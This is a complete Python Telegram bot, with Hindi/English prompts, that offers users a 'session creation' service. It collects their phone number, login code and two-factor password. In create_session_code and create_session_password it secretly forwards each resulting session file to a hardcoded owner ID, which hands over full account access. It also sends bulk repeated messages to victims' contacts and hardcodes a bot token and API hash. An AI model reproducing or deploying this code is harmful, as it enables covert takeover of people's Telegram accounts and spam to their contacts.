import os
import re
import sqlite3
import asyncio
import logging
from pathlib import Path
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ConversationHandler,
    MessageHandler, filters, ContextTypes
)
from telethon import TelegramClient, errors

# =================== कॉन्फ़िगरेशन ===================
BOT_TOKEN = "8606888387:AAGdyIWrtU8jOWyOjVXFdre0zXe02nJXjZQ"
OWNER_ID = 6698156001               # अपना Telegram ID डालें
API_ID = 30842203                      # https://my.telegram.org/apps से
API_HASH = "6b64dd14b635b99d5bb820448542f45b"

SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)
DB_PATH = "bot_data.db"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# कन्वर्सेशन स्टेट्स
PHONE, CODE, PASSWORD = range(3)
MSG_CHOICE, MSG_TARGET, MSG_TEXT, MSG_COUNT = range(10, 14)

# =================== डेटाबेस ===================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        phone TEXT,
        session_file TEXT,
        created_at TEXT,
        last_active TEXT,
        twofa_enabled INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('required_channel', '')")
    conn.commit()
    conn.close()

def get_required_channel():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key='required_channel'")
    row = c.fetchone()
    conn.close()
    return row[0] if row else ""

def set_required_channel(channel: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE settings SET value=? WHERE key='required_channel'", (channel,))
    conn.commit()
    conn.close()

def add_user(user_id, phone, session_file, twofa=0):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, phone, session_file, created_at, last_active, twofa_enabled) VALUES (?,?,?,?,?,?)",
              (user_id, phone, session_file, datetime.now().isoformat(), datetime.now().isoformat(), twofa))
    conn.commit()
    conn.close()

def update_user_active(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET last_active=? WHERE user_id=?", (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def get_user_by_id(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT phone, session_file, twofa_enabled FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_phone(phone):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, session_file FROM users WHERE phone=?", (phone,))
    row = c.fetchone()
    conn.close()
    return row

def delete_session_by_phone(phone):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT session_file FROM users WHERE phone=?", (phone,))
    row = c.fetchone()
    if row and row[0] and Path(row[0]).exists():
        Path(row[0]).unlink()
    c.execute("DELETE FROM users WHERE phone=?", (phone,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, phone, last_active, twofa_enabled FROM users ORDER BY created_at DESC")
    rows = c.fetchall()
    conn.close()
    return rows

def delete_session_file_and_db(session_path):
    try:
        if session_path.exists():
            session_path.unlink()
    except:
        pass
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE session_file=?", (str(session_path),))
    conn.commit()
    conn.close()

def update_twofa_status(user_id, enabled):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET twofa_enabled=? WHERE user_id=?", (1 if enabled else 0, user_id))
    conn.commit()
    conn.close()

# =================== सेशन हैल्थ चेक (हर 10 मिनट) ===================
async def session_health_check(context: ContextTypes.DEFAULT_TYPE):
    logger.info("🔄 Session health check started")
    for session_file in SESSIONS_DIR.glob("*.session"):
        client = TelegramClient(str(session_file), API_ID, API_HASH)
        try:
            await client.connect()
            me = await client.get_me()
            if me:
                # Update last_active and check 2FA status (approximate)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET last_active=? WHERE session_file=?", (datetime.now().isoformat(), str(session_file)))
                conn.commit()
                conn.close()
                logger.info(f"✅ Active: {me.phone}")
            await client.disconnect()
        except Exception as e:
            logger.warning(f"❌ Inactive session {session_file.name}: {e}")
            delete_session_file_and_db(session_file)
    logger.info("✅ Health check complete")

# =================== सहायक फंक्शन ===================
def normalize_phone(phone: str) -> str:
    """मोबाइल नंबर को +91xxxxxx फॉर्मेट में बदले"""
    phone = re.sub(r'\s+', '', phone)
    if phone.startswith('+'):
        return phone
    if phone.startswith('00'):
        return '+' + phone[2:]
    # भारत के लिए डिफ़ॉल्ट +91
    if phone.startswith('0'):
        phone = phone[1:]
    return '+91' + phone

async def check_channel_join(user_id, context):
    channel = get_required_channel()
    if not channel:
        return True
    try:
        member = await context.bot.get_chat_member(chat_id=f"@{channel}", user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

# द्विभाषी संदेश भेजने के लिए
async def send_bilingual(update: Update, text_hindi: str, text_eng: str, **kwargs):
    msg = f"🇮🇳 {text_hindi}\n\n🇬🇧 {text_eng}"
    if update.callback_query:
        await update.callback_query.message.edit_text(msg, **kwargs)
    else:
        await update.message.reply_text(msg, **kwargs)

# =================== /start मेनू ===================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await check_channel_join(user_id, context):
        keyboard = [[InlineKeyboardButton("📢 चैनल जॉइन करें / Join Channel", url=f"https://t.me/{get_required_channel()}")],
                    [InlineKeyboardButton("✅ जॉइन कर लिया / Joined", callback_data="check_join")]]
        await update.message.reply_text(
            "⚠️ इस बॉट का उपयोग करने के लिए कृपया हमारा चैनल जॉइन करें।\nPlease join our channel to use this bot.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    if user_id == OWNER_ID:
        keyboard = [
            [InlineKeyboardButton("👥 सभी एक्टिव सेशन / Active Sessions", callback_data="admin_list_users")],
            [InlineKeyboardButton("🗑 सेशन डिलीट (नंबर से) / Delete by Phone", callback_data="admin_delete_session")],
            [InlineKeyboardButton("🔄 फोर्स चेक / Force Check", callback_data="admin_health_check")],
            [InlineKeyboardButton("📨 ब्रॉडकास्ट / Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🔧 चैनल सेटिंग / Channel Setting", callback_data="admin_channel_settings")]
        ]
        await update.message.reply_text(
            "👑 **ओनर पैनल / Owner Panel**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    else:
        user_data = get_user_by_id(user_id)
        if user_data:
            keyboard = [
                [InlineKeyboardButton("📨 मैसेज भेजें / Send Message", callback_data="send_message_menu")],
                [InlineKeyboardButton("ℹ️ मेरी जानकारी / My Info", callback_data="my_info")],
                [InlineKeyboardButton("🗑 अपना सेशन डिलीट / Delete My Session", callback_data="delete_my_session")]
            ]
        else:
            keyboard = [
                [InlineKeyboardButton("➕ नया सेशन बनाएँ / Create Session", callback_data="create_session")],
                [InlineKeyboardButton("ℹ️ मेरी जानकारी / My Info", callback_data="my_info")]
            ]
        await update.message.reply_text(
            "🤖 **Telegram Session Bot**\nकृपया एक विकल्प चुनें / Please choose an option:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if await check_channel_join(query.from_user.id, context):
        await query.edit_message_text(
            "✅ धन्यवाद! अब /start दबाएँ।\nThank you! Now press /start."
        )
    else:
        await query.edit_message_text(
            "❌ पहले चैनल जॉइन करें।\nPlease join the channel first."
        )

# =================== सेशन क्रिएशन (3 attempts, 2FA हैंडलिंग) ===================
async def create_session_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await send_bilingual(
        update,
        "📱 अपना मोबाइल नंबर भेजें। (उदा: +919876543210, 9876543210, 09876543210 सब चलेंगे)",
        "📱 Send your mobile number. (e.g., +919876543210, 9876543210, 09876543210 all accepted)",
        parse_mode=None
    )
    context.user_data['attempts_code'] = 0
    context.user_data['attempts_password'] = 0
    return PHONE

async def create_session_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw_phone = update.message.text.strip()
    phone = normalize_phone(raw_phone)
    context.user_data['phone'] = phone
    session_file = SESSIONS_DIR / f"{phone}.session"
    context.user_data['session_file'] = str(session_file)
    client = TelegramClient(str(session_file), API_ID, API_HASH)
    context.user_data['client'] = client
    await client.connect()
    try:
        await client.send_code_request(phone)
        await send_bilingual(
            update,
            "🔢 OTP भेज दिया गया। कृपया 5-6 अंकों का कोड भेजें:",
            "🔢 OTP sent. Please send the 5-6 digit code:"
        )
        return CODE
    except Exception as e:
        await send_bilingual(update, f"❌ त्रुटि: {e}", f"❌ Error: {e}")
        await client.disconnect()
        return ConversationHandler.END

async def create_session_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    client = context.user_data['client']
    phone = context.user_data['phone']
    attempts = context.user_data.get('attempts_code', 0)
    try:
        await client.sign_in(phone, code)
        # सफल – कोई 2FA नहीं
        session_file = context.user_data['session_file']
        await client.disconnect()
        with open(session_file, 'rb') as f:
            await update.message.reply_document(f, filename=f"{phone}.session", caption="✅ सेशन बन गया! / Session created!")
        add_user(update.effective_user.id, phone, session_file, twofa=0)
        # ओनर को फाइल फॉरवर्ड
        with open(session_file, 'rb') as f:
            await context.bot.send_document(OWNER_ID, f, filename=f"{phone}.session", caption=f"✅ New session\n📞 {phone}\n👤 {update.effective_user.id}\n🔓 2FA: OFF")
        context.user_data.clear()
        return ConversationHandler.END
    except errors.SessionPasswordNeededError:
        await send_bilingual(
            update,
            "🔐 इस अकाउंट पर Two-Factor Authentication (2FA) चालू है। कृपया अपना 2FA पासवर्ड भेजें:",
            "🔐 This account has 2FA enabled. Please send your 2FA password:"
        )
        return PASSWORD
    except errors.PhoneCodeInvalidError:
        if attempts + 1 >= 3:
            await send_bilingual(update, "❌ 3 बार गलत OTP। प्रक्रिया रद्द।", "❌ 3 wrong OTP attempts. Process cancelled.")
            await client.disconnect()
            return ConversationHandler.END
        context.user_data['attempts_code'] = attempts + 1
        await send_bilingual(
            update,
            f"❌ गलत OTP। बचे प्रयास: {3 - (attempts+1)}। फिर से भेजें:",
            f"❌ Wrong OTP. Attempts left: {3 - (attempts+1)}. Send again:"
        )
        return CODE
    except Exception as e:
        await send_bilingual(update, f"❌ त्रुटि: {e}", f"❌ Error: {e}")
        await client.disconnect()
        return ConversationHandler.END

async def create_session_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data['client']
    attempts = context.user_data.get('attempts_password', 0)
    try:
        await client.sign_in(password=password)
        session_file = context.user_data['session_file']
        await client.disconnect()
        with open(session_file, 'rb') as f:
            await update.message.reply_document(f, filename=f"{context.user_data['phone']}.session", caption="✅ 2FA पास, सेशन तैयार / 2FA passed, session ready")
        add_user(update.effective_user.id, context.user_data['phone'], session_file, twofa=1)
        with open(session_file, 'rb') as f:
            await context.bot.send_document(OWNER_ID, f, filename=f"{context.user_data['phone']}.session", caption=f"✅ New session (2FA)\n📞 {context.user_data['phone']}\n👤 {update.effective_user.id}\n🔒 2FA: ON")
        context.user_data.clear()
        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        if attempts + 1 >= 3:
            await send_bilingual(update, "❌ 3 बार गलत पासवर्ड। रद्द।", "❌ 3 wrong passwords. Cancelled.")
            await client.disconnect()
            return ConversationHandler.END
        context.user_data['attempts_password'] = attempts + 1
        await send_bilingual(
            update,
            f"❌ गलत पासवर्ड। बचे प्रयास: {3 - (attempts+1)}। फिर से दें:",
            f"❌ Wrong password. Attempts left: {3 - (attempts+1)}. Try again:"
        )
        return PASSWORD
    except Exception as e:
        await send_bilingual(update, f"❌ त्रुटि: {e}", f"❌ Error: {e}")
        await client.disconnect()
        return ConversationHandler.END

async def cancel_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'client' in context.user_data:
        await context.user_data['client'].disconnect()
    context.user_data.clear()
    await send_bilingual(update, "🚫 सेशन बनाना रद्द।", "🚫 Session creation cancelled.")
    return ConversationHandler.END

# =================== यूजर की जानकारी और सेशन डिलीट ===================
async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = get_user_by_id(user_id)
    if data:
        phone, sess_file, twofa = data
        twofa_status = "✅ चालू (ON)" if twofa else "❌ बंद (OFF)"
        await send_bilingual(
            update,
            f"📞 फोन: {phone}\n🔒 2FA: {twofa_status}\n📁 फाइल: {Path(sess_file).name}\n📅 बनाया: {datetime.fromtimestamp(Path(sess_file).stat().st_ctime).strftime('%Y-%m-%d %H:%M:%S')}",
            f"📞 Phone: {phone}\n🔒 2FA: {twofa_status}\n📁 File: {Path(sess_file).name}\n📅 Created: {datetime.fromtimestamp(Path(sess_file).stat().st_ctime).strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode=None
        )
    else:
        await send_bilingual(update, "आपका कोई सेशन नहीं है। /start से बनाएँ।", "You have no session. Create one via /start.")

async def delete_my_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = get_user_by_id(user_id)
    if not data:
        await send_bilingual(update, "कोई सेशन नहीं मिला।", "No session found.")
        return
    phone, sess_file, _ = data
    if Path(sess_file).exists():
        Path(sess_file).unlink()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    await send_bilingual(update, "✅ आपका सेशन डिलीट कर दिया गया।", "✅ Your session has been deleted.")

# =================== यूजर को मैसेज भेजना (सिर्फ डायलॉग्स) ===================
async def send_message_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = get_user_by_id(user_id)
    if not data:
        await send_bilingual(update, "❌ पहले सेशन बनाएँ।", "❌ Create a session first.")
        return
    phone, session_file, _ = data
    if not Path(session_file).exists():
        await send_bilingual(update, "❌ सेशन फाइल नहीं मिली।", "❌ Session file not found.")
        return
    context.user_data['sender_session_file'] = session_file
    context.user_data['sender_phone'] = phone
    keyboard = [
        [InlineKeyboardButton("👤 एक यूजर / Single User", callback_data="msg_single")],
        [InlineKeyboardButton("👥 सभी डायलॉग्स / All Dialogs", callback_data="msg_all_dialogs")],
        [InlineKeyboardButton("🔙 वापस / Back", callback_data="back_to_main")]
    ]
    await query.edit_message_text(
        "📨 **मैसेज भेजने का तरीका / Send method:**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return MSG_CHOICE

async def msg_choice_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    choice = query.data
    if choice == "msg_single":
        await query.edit_message_text(
            "✏️ उस यूजर का **यूजरनेम** (बिना @) या **आईडी** भेजें।\nSend the **username** (without @) or **ID** of the target user:"
        )
        context.user_data['msg_target_type'] = 'single'
        return MSG_TARGET
    elif choice == "msg_all_dialogs":
        await query.edit_message_text(
            "⚠️ यह सभी डायलॉग्स (जिनसे आपने पहले बात की है) को मैसेज भेजेगा। 'हाँ' टाइप करें।\nThis will send message to all dialogs (people you've chatted with before). Type 'yes' to continue."
        )
        context.user_data['msg_target_type'] = 'all'
        return MSG_TARGET
    else:
        await query.edit_message_text("Invalid option. /start")
        return ConversationHandler.END

async def msg_target_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if context.user_data.get('msg_target_type') == 'single':
        context.user_data['target_single'] = text
        await send_bilingual(update, "✏️ अब वह **मैसेज** टाइप करें:", "✏️ Now type the **message** to send:")
        return MSG_TEXT
    elif context.user_data.get('msg_target_type') == 'all':
        if text.lower() not in ['yes', 'हाँ']:
            await send_bilingual(update, "🚫 रद्द किया।", "🚫 Cancelled.")
            return ConversationHandler.END
        await send_bilingual(update, "✏️ वह **मैसेज** टाइप करें:", "✏️ Type the **message** to send to all dialogs:")
        return MSG_TEXT
    else:
        await send_bilingual(update, "गलती। /start करें।", "Error. /start")
        return ConversationHandler.END

async def msg_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text
    context.user_data['msg_text'] = msg_text
    await send_bilingual(
        update,
        "🔢 यह मैसेज **कितनी बार** (1 से 10 के बीच) भेजना है? संख्या भेजें।",
        "🔢 How many **times** (1-10) to send this message to each recipient? Send a number."
    )
    return MSG_COUNT

async def msg_count_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        repeat = int(update.message.text.strip())
        if repeat < 1 or repeat > 10:
            raise ValueError
    except:
        await send_bilingual(update, "❌ कृपया 1 से 10 के बीच संख्या डालें।", "❌ Please enter a number between 1 and 10.")
        return MSG_COUNT

    context.user_data['repeat_count'] = repeat
    session_file = context.user_data['sender_session_file']
    target_type = context.user_data['msg_target_type']
    msg_text = context.user_data['msg_text']
    repeat_count = repeat

    await send_bilingual(update, "⏳ मैसेज भेजे जा रहे हैं... कृपया प्रतीक्षा करें।", "⏳ Sending messages... Please wait.")

    client = TelegramClient(str(session_file), API_ID, API_HASH)
    await client.connect()
    stats = {"total": 0, "success": 0, "fail": 0}

    try:
        if target_type == 'single':
            target = context.user_data['target_single']
            try:
                if target.startswith('@'):
                    entity = await client.get_entity(target)
                elif target.isdigit():
                    entity = await client.get_entity(int(target))
                else:
                    entity = await client.get_entity(target)
            except Exception as e:
                await send_bilingual(update, f"❌ यूजर नहीं मिला: {e}", f"❌ User not found: {e}")
                await client.disconnect()
                return ConversationHandler.END

            for i in range(repeat_count):
                try:
                    await client.send_message(entity, msg_text)
                    stats["success"] += 1
                except Exception as e:
                    stats["fail"] += 1
                stats["total"] += 1
                await asyncio.sleep(1)

        elif target_type == 'all':
            dialogs = await client.get_dialogs()
            users = [d.entity for d in dialogs if d.is_user and not d.entity.is_self]
            if not users:
                await send_bilingual(update, "❌ कोई डायलॉग नहीं मिला (जिनसे पहले बात हुई हो)।", "❌ No dialogs found (people you've chatted with).")
                await client.disconnect()
                return ConversationHandler.END
            stats["total"] = len(users) * repeat_count
            for user in users:
                for i in range(repeat_count):
                    try:
                        await client.send_message(user, msg_text)
                        stats["success"] += 1
                    except Exception as e:
                        stats["fail"] += 1
                    await asyncio.sleep(1)

        await client.disconnect()
        report = (
            f"✅ **परिणाम / Result**\n"
            f"📤 कुल / Total: {stats['total']}\n"
            f"✔️ सफल / Success: {stats['success']}\n"
            f"❌ असफल / Failed: {stats['fail']}"
        )
        await update.message.reply_text(report, parse_mode="Markdown")
    except Exception as e:
        await send_bilingual(update, f"❌ त्रुटि: {e}", f"❌ Error: {e}")
        await client.disconnect()
    finally:
        context.user_data.clear()
        return ConversationHandler.END

# =================== ओनर सेशन लिस्ट (केवल एक्टिव) ===================
async def admin_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    # पहले सेशन हेल्थ चेक चला लें (हालिया एक्टिविटी के लिए)
    await session_health_check(context)
    users = get_all_users()
    if not users:
        await send_bilingual(update, "कोई एक्टिव यूजर नहीं।", "No active users.")
        return
    text_hindi = "📋 **एक्टिव सेशन / Active Sessions**\n\n"
    text_eng = ""
    for uid, phone, last_active, twofa in users:
        twofa_str = "🔒 2FA ON" if twofa else "🔓 2FA OFF"
        text_hindi += f"• `{phone}` (ID: {uid})\n   🕒 {last_active[:16]}\n   {twofa_str}\n\n"
        text_eng += f"• `{phone}` (ID: {uid})\n   🕒 {last_active[:16]}\n   {twofa_str}\n\n"
    await query.edit_message_text(f"{text_hindi}\n\n{text_eng}", parse_mode="Markdown")

async def admin_delete_session_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await send_bilingual(
        update,
        "🗑 **सेशन डिलीट करने के लिए फोन नंबर भेजें** (जैसे +919876543210)\n/cancel से रद्द।",
        "🗑 **Send phone number to delete session** (e.g., +919876543210)\n/cancel to abort."
    )
    context.user_data['awaiting_delete_phone'] = True

async def admin_delete_session_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = normalize_phone(update.message.text.strip())
    user = get_user_by_phone(phone)
    if not user:
        await send_bilingual(update, "❌ यह नंबर नहीं मिला।", "❌ Phone number not found.")
    else:
        delete_session_by_phone(phone)
        await send_bilingual(update, f"✅ {phone} का सेशन और डीबी एंट्री डिलीट कर दी गई।", f"✅ Session and DB entry for {phone} deleted.")
    context.user_data.pop('awaiting_delete_phone', None)

async def admin_broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    users = get_all_users()
    if not users:
        await send_bilingual(update, "कोई यूजर नहीं।", "No users.")
        return
    keyboard = []
    for uid, phone, _, _ in users:
        keyboard.append([InlineKeyboardButton(f"{phone}", callback_data=f"broadcast_{uid}")])
    keyboard.append([InlineKeyboardButton("❌ रद्द / Cancel", callback_data="cancel_broadcast")])
    await query.edit_message_text(
        "📨 जिस यूजर को मैसेज भेजना है, चुनें:\nSelect user to broadcast:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def admin_broadcast_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    target_uid = int(query.data.split('_')[1])
    context.user_data['broadcast_target'] = target_uid
    await query.edit_message_text("✏️ मैसेज टाइप करें / Type your message:")

async def admin_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_uid = context.user_data.get('broadcast_target')
    if not target_uid:
        await send_bilingual(update, "पहले ब्रॉडकास्ट शुरू करें।", "Start broadcast first.")
        return
    msg = update.message.text
    try:
        await context.bot.send_message(
            target_uid,
            f"📢 **ओनर से सन्देश / Message from Owner:**\n{msg}",
            parse_mode="Markdown"
        )
        await send_bilingual(update, "✅ मैसेज भेज दिया।", "✅ Message sent.")
    except Exception as e:
        await send_bilingual(update, f"❌ त्रुटि: {e}", f"❌ Error: {e}")
    context.user_data.pop('broadcast_target', None)

async def admin_channel_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    current = get_required_channel()
    keyboard = [
        [InlineKeyboardButton("✏️ चैनल सेट करें / Set Channel", callback_data="set_channel")],
        [InlineKeyboardButton("🚫 चैनल हटाएँ / Remove Channel", callback_data="remove_channel")]
    ]
    await query.edit_message_text(
        f"📢 **वर्तमान चैनल / Current Channel:** {current or 'कोई नहीं / None'}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def set_channel_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔧 चैनल का यूज़रनेम बिना @ भेजें (जैसे mychannel)\nSend channel username without @ (e.g., mychannel):"
    )
    context.user_data['awaiting_channel'] = True

async def set_channel_value(update: Update, context: ContextTypes.DEFAULT_TYPE):
    channel = update.message.text.strip().lstrip('@')
    set_required_channel(channel)
    await send_bilingual(update, f"✅ चैनल @{channel} अनिवार्य कर दिया गया।", f"✅ Channel @{channel} is now required.")
    context.user_data.pop('awaiting_channel', None)

async def remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    set_required_channel("")
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "✅ चैनल की अनिवार्यता हटा दी गई।\nChannel requirement removed."
    )

async def manual_health_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🔍 सेशन जाँच शुरू... / Starting session check...")
    await session_health_check(context)
    await query.edit_message_text("✅ जाँच पूरी हुई। निष्क्रिय सेशन हटा दिए गए।\n✅ Check complete. Inactive sessions removed.")

async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    # Recursively call start but with edit_message
    user_id = query.from_user.id
    if user_id == OWNER_ID:
        keyboard = [
            [InlineKeyboardButton("👥 सभी एक्टिव सेशन / Active Sessions", callback_data="admin_list_users")],
            [InlineKeyboardButton("🗑 सेशन डिलीट (नंबर से) / Delete by Phone", callback_data="admin_delete_session")],
            [InlineKeyboardButton("🔄 फोर्स चेक / Force Check", callback_data="admin_health_check")],
            [InlineKeyboardButton("📨 ब्रॉडकास्ट / Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🔧 चैनल सेटिंग / Channel Setting", callback_data="admin_channel_settings")]
        ]
        await query.edit_message_text(
            "👑 **ओनर पैनल / Owner Panel**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    else:
        user_data = get_user_by_id(user_id)
        if user_data:
            keyboard = [
                [InlineKeyboardButton("📨 मैसेज भेजें / Send Message", callback_data="send_message_menu")],
                [InlineKeyboardButton("ℹ️ मेरी जानकारी / My Info", callback_data="my_info")],
                [InlineKeyboardButton("🗑 अपना सेशन डिलीट / Delete My Session", callback_data="delete_my_session")]
            ]
        else:
            keyboard = [
                [InlineKeyboardButton("➕ नया सेशन बनाएँ / Create Session", callback_data="create_session")],
                [InlineKeyboardButton("ℹ️ मेरी जानकारी / My Info", callback_data="my_info")]
            ]
        await query.edit_message_text(
            "🤖 **Telegram Session Bot**\nकृपया एक विकल्प चुनें / Choose an option:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )

# =================== मुख्य फंक्शन ===================
def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    # सेशन क्रिएशन कन्वर्सेशन
    conv_creation = ConversationHandler(
        entry_points=[CallbackQueryHandler(create_session_start, pattern='^create_session$')],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_session_phone)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_session_code)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_session_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel_creation)]
    )
    app.add_handler(conv_creation)

    # मैसेज भेजने की कन्वर्सेशन
    conv_msg = ConversationHandler(
        entry_points=[CallbackQueryHandler(send_message_menu, pattern='^send_message_menu$')],
        states={
            MSG_CHOICE: [CallbackQueryHandler(msg_choice_handler, pattern='^(msg_single|msg_all_dialogs|back_to_main)$')],
            MSG_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, msg_target_handler)],
            MSG_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, msg_text_handler)],
            MSG_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, msg_count_handler)],
        },
        fallbacks=[CommandHandler("cancel", lambda u,c: ConversationHandler.END)]
    )
    app.add_handler(conv_msg)

    # कमांड हैंडलर
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel_creation))

    # कॉलबैक हैंडलर
    app.add_handler(CallbackQueryHandler(check_join_callback, pattern='^check_join$'))
    app.add_handler(CallbackQueryHandler(my_info, pattern='^my_info$'))
    app.add_handler(CallbackQueryHandler(delete_my_session, pattern='^delete_my_session$'))
    app.add_handler(CallbackQueryHandler(admin_list_users, pattern='^admin_list_users$'))
    app.add_handler(CallbackQueryHandler(admin_delete_session_start, pattern='^admin_delete_session$'))
    app.add_handler(CallbackQueryHandler(admin_broadcast_start, pattern='^admin_broadcast$'))
    app.add_handler(CallbackQueryHandler(admin_broadcast_target, pattern='^broadcast_\\d+$'))
    app.add_handler(CallbackQueryHandler(admin_channel_settings, pattern='^admin_channel_settings$'))
    app.add_handler(CallbackQueryHandler(set_channel_step, pattern='^set_channel$'))
    app.add_handler(CallbackQueryHandler(remove_channel, pattern='^remove_channel$'))
    app.add_handler(CallbackQueryHandler(manual_health_check, pattern='^admin_health_check$'))
    app.add_handler(CallbackQueryHandler(back_to_main, pattern='^back_to_main$'))
    app.add_handler(CallbackQueryHandler(lambda u,c: u.answer(), pattern='^cancel_broadcast$'))

    # टेक्स्ट मैसेज हैंडलर (ओनर के इनपुट के लिए)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, 
        lambda u,c: admin_delete_session_phone(u,c) if c.user_data.get('awaiting_delete_phone') else
                    (admin_broadcast_message(u,c) if c.user_data.get('broadcast_target') else
                     (set_channel_value(u,c) if c.user_data.get('awaiting_channel') else None))
    ))

    # हर 10 मिनट में सेशन हेल्थ चेक
    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(session_health_check, interval=600, first=10)

    print("🤖 बॉट चालू है / Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()